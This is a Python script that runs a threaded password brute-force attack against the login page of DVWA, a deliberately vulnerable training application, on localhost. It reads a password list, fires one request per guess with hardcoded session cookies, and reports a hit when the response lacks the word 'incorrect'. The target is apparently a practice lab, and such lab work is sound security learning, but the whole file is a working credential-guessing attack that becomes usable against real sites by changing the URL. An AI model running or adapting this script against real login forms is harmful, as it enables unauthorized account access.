import threading
import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

password = "pass"
passFilePath = "passwords.txt"
passFile = open(passFilePath)

attempt = 0

def makeRequest(url,password) :
    global attempt
    attempt += 1
    sids = [
        'njos0jhhcj197l8dj3d9bs08co',
        '48drtsq3vsvdje3dbse8vi9ppc',
        'kdrhi58ggdq31q9jr1gmf4su2o'
    ]
    l = len(sids)

    cookies = {
        'security':'medium' ,
        'PHPSESSID':sids[0]
    }

    response = requests.get(url=url,cookies=cookies)

    if not "incorrect" in response.text :
        print(f"{bcolors.OKGREEN}[+] Password Found {password}{bcolors.ENDC}")
    else :
        print(f"[-] Failed with {password}")

for password in passFile.readlines() :
    password = password.strip('\n')
    url = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&Login=Login'

    thread = threading.Thread(target=makeRequest,args=(url,password,))
    thread.start()